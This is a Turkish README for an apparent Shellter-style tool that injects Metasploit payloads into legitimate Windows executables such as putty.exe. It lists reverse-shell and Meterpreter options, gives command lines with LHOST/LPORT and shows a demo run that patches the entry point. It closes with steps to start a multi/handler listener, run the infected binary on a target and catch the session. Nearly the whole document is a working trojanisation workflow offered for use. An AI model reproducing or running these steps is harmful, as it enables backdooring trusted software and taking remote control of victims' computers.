# PE Infector v3.0 - Shellter Style Tool

Shellter benzeri PE enfeksiyon aracı. Entegre payload üretimi ile!

## Özellikler

- ✅ **Shellter tarzı interaktif menü**
- ✅ **Entegre msfvenom** - Payload seçimi dahili
- ✅ **x86 ve x64 tam destek**
- ✅ **7 hazır payload seçeneği**
- ✅ **Code cave veya yeni section**

## Kurulum

```bash
pip install pefile
```

**Gereksinimler:**
- Python 3.8+
- pefile kütüphanesi
- Metasploit Framework (msfvenom için)

## Kullanım

### İnteraktif Mod (Shellter gibi)

```bash
python pe_infector.py
```

Adım adım sorar:
1. Hedef PE dosyası
2. Payload seçimi (menüden)
3. LHOST / LPORT
4. Enjeksiyon yöntemi
5. Çıktı dosyası

### Komut Satırı

```bash
# Meterpreter Reverse TCP
python pe_infector.py -t putty.exe -p 1 --lhost 192.168.1.100 --lport 4444

# Shell Reverse TCP
python pe_infector.py -t putty.exe -p 4 --lhost 192.168.1.100

# Test (calc.exe)
python pe_infector.py -t putty.exe -p 7

# Hazır shellcode dosyasıyla
python pe_infector.py -t putty.exe -s payload.bin -o infected.exe
```

## Payload Listesi

| # | Payload | Açıklama |
|---|---------|----------|
| 1 | Meterpreter Reverse TCP | Tam özellikli shell (staged) |
| 2 | Meterpreter Reverse HTTP | Firewall bypass |
| 3 | Meterpreter Reverse HTTPS | Şifreli bağlantı |
| 4 | Shell Reverse TCP | Basit cmd.exe shell |
| 5 | Shell Bind TCP | Port dinleyen shell |
| 6 | Meterpreter Stageless | Tek parça, daha stabil |
| 7 | Execute (calc.exe) | Test için |

## Demo

```
$ python pe_infector.py

[+] msfvenom bulundu: Framework 6.3.4

════════════════════════════════════════════════════════════
ADIM 1: HEDEF PE DOSYASI
════════════════════════════════════════════════════════════

[?] PE Target (hedef dosya yolu):
    > putty.exe

[*] PE dosyası yükleniyor: putty.exe
[*] Mimari: x64 (64-bit)
[*] Original Entry Point (RVA): 0x54b90

════════════════════════════════════════════════════════════
PAYLOAD SEÇİMİ
════════════════════════════════════════════════════════════

  [1] Meterpreter Reverse TCP
      Tam özellikli Meterpreter shell (staged)

  [2] Meterpreter Reverse HTTP
      HTTP üzerinden Meterpreter (firewall bypass)
  ...

[?] Payload seçin (1-7):
    > 1

[?] LHOST (Kali IP adresi):
    > 192.168.1.100

[?] LPORT [4444]:
    > 4444

[*] Payload üretiliyor...
    Komut: msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread
[+] Payload üretildi: 510 bytes

════════════════════════════════════════════════════════════
ENJEKSİYON
════════════════════════════════════════════════════════════

[+] Code cave bulundu: .text
    RVA: 0x52400
    Boyut: 4096 bytes

[*] Entry Point değiştirildi:
    Eski: 0x54b90 → Yeni: 0x52400

[+] Enjeksiyon tamamlandı!
[+] Kaydedildi: putty_infected.exe

════════════════════════════════════════════════════════════
✅ ENJEKSİYON BAŞARILI!
════════════════════════════════════════════════════════════

    SONRAKİ ADIMLAR:

    1. Kali'de listener başlat:
       msfconsole -q
       use exploit/multi/handler
       set PAYLOAD windows/x64/meterpreter/reverse_tcp
       set LHOST 192.168.1.100
       set LPORT 4444
       run

    2. Windows hedefte çalıştır:
       putty_infected.exe

    3. Session'ı al! 🎉
```

## Yazar

Uğur Ateş - SOC Team Lead
